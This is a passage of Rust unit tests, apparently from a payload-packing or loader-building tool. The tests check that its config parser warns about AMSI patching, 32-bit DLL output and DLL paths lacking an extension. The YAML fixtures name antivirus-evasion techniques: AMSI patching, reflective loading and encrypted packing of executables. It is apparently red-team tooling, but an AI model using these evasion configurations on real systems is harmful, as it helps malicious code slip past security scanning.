            "  - technique: patch_amsi\n  - technique: reflective_loading\n",
        ));
        let warnings = advisories(&plan);
        assert!(
            warnings.iter().any(|w| w.contains("patch_amsi")),
            "expected an AMSI advisory: {warnings:?}"
        );
    }

    #[test]
    fn advises_on_a_32_bit_dll() {
        let plan = parse(&with_dll(
            "    entry: export:Run\n    arch: x86\n    sign: { mode: lab }\n",
            dll_runtime(),
        ));
        let warnings = advisories(&plan);
        assert!(
            warnings.iter().any(|w| w.contains("32-bit")),
            "expected an x86 advisory: {warnings:?}"
        );
    }

    #[test]
    fn advises_on_a_dll_path_without_the_extension() {
        let yaml = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    p: { source: ./p.exe, format: pe }\n  output:\n    path: ./dist/o.bin\n    kind: dll\n    entry: export:Run\n    sign: { mode: lab }\nruntime:\n  - technique: reflective_loading\n";
        let plan = parse(yaml);
        let warnings = advisories(&plan);
        assert!(
            warnings.iter().any(|w| w.contains("`.dll`")),
            "expected an extension advisory: {warnings:?}"
        );
    }
}
